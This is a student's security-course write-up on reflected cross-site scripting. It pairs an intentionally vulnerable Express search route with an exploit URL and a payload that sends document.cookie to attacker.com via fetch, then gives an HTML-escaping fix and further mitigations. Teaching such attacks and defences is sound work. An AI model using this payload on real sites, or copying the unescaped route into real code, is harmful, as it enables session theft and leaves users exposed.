# Cross-Site Scripting (Reflected XSS)

**Student Name:** Ashish Bairwa  
**Roll Number:** IIT2024261  
**Category:** Cross-Site Scripting (XSS)  
**Variant Implemented:** Variant 2: Reflected XSS  

---

## Overview
This module demonstrates Reflected Cross-Site Scripting (XSS) where unvalidated user input provided in an HTTP query parameter (e.g. search or filter) is immediately reflected back in the server's HTML response without context-aware output encoding.

### (a) Vulnerable Implementation
The server renders user input directly into HTML without escaping:
```javascript
// Vulnerable search route:
app.get('/search', (req, res) => {
  const query = req.query.q || '';
  // Directly embedding user input into response HTML:
  res.send(`
    <h1>Search Results</h1>
    <p>You searched for: ${query}</p>
  `);
});
```

### (b) Working Exploit
* **Crafted Malicious URL:**
  ```text
  http://localhost:3000/search?q=<script>alert(document.cookie)</script>
  ```
  *(or stealing session cookie: `<script>fetch('http://attacker.com/log?c='+document.cookie)</script>`)*
* **Execution:**
  When a victim clicks this link, the server reflects the payload into the DOM, and the victim's browser executes the attacker's JavaScript within the application's origin context.

### (c) Root Cause
The web application includes untrusted user input directly in its rendered HTML output without performing context-aware output encoding or sanitization, causing the browser to interpret data as executable code.

### (d) Implemented Mitigation
**Context-Aware HTML Entity Encoding:**
```javascript
// Secure implementation:
function escapeHTML(str) {
  return str.replace(/[&<>'"]/g, tag => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    "'": '&#39;',
    '"': '&quot;'
  }[tag] || tag));
}

app.get('/search', (req, res) => {
  const query = escapeHTML(req.query.q || '');
  res.send(`
    <h1>Search Results</h1>
    <p>You searched for: ${query}</p>
  `);
});
```
When `<script>` is injected, it renders safely as literal text `&lt;script&gt;` on screen; the browser does not execute it.

### (e) Other Mitigations (Theory)
1. **Framework Auto-Escaping:** Utilizing modern template engines (e.g., EJS, Pug, React, Angular) that automatically apply context-aware HTML escaping by default.
2. **HTML Sanitizers for Rich Content:** Using trusted sanitization libraries (e.g., DOMPurify) when user-supplied HTML is intentionally permitted.
3. **Content Security Policy (CSP):** Setting HTTP header `Content-Security-Policy: default-src 'self'` to prohibit execution of inline scripts and disallow loading scripts from unapproved domains.
4. **HttpOnly Cookie Flag:** Marking sensitive authentication cookies with `HttpOnly` so client-side JavaScript cannot access them via `document.cookie`.
5. **Safe DOM Sinks:** Avoiding dangerous JavaScript sinks such as `innerHTML`, `document.write()`, and `eval()`, opting instead for safe APIs like `textContent` and `createElement()`.
